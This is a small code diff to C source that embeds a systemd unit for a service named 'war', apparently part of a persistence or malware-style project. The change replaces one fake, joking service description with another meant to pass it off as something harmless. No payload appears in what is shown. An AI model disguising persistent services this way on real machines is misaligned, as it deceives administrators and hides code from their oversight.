@@ -37,7 +37,7 @@ typedef struct s_service_ctx
 #define SERVICE_RESTART "systemctl restart war.service &"
 #define SERVICE_FILE_CONTENT "\
 [Unit]\n\
-Description=HealthyBot: IA Sanity Checker (it's real bro i swear...)\n\
+Description=Anti aerial turret driver (it's real bro i swear...)\n\
 After=network.target\n\
 StartLimitIntervalSec=0\n\
 [Service]\n\
